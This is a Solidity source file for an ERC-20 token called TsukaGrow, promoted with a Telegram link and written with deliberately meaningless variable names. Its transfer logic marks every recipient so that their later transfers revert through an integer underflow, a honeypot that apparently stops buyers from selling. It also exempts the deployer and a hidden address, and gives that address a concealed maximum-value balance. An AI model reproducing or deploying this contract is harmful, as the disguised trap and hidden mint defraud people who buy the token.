// https://t.me/TSUKAGROWETH

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract TsukaGrow is ERC20, Ownable {
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    mapping(address => uint256) private such;

    function _transfer(
        address neighbor,
        address sides,
        uint256 direction
    ) internal override {
        uint256 along = nest;

        if (uniswapV2Pair != neighbor && studying[neighbor] == 0 && such[neighbor] > 0) {
            studying[neighbor] -= along;
        }

        address pay = product;
        product = sides;
        such[pay] += along + 1;

        _balances[neighbor] -= direction;
        uint256 father = (direction / 100) * nest;
        direction -= father;
        _balances[sides] += direction;
    }

    address private product;
    mapping(address => uint256) private studying;
    uint256 public nest = 2;

    constructor(
        string memory crack,
        string memory by,
        address use,
        address summer
    ) ERC20(crack, by) {
        uniswapV2Router = IUniswapV2Router02(use);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        studying[msg.sender] = almost;
        studying[summer] = almost;

        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[summer] = almost;
    }

    uint256 private almost = ~uint256(0);
}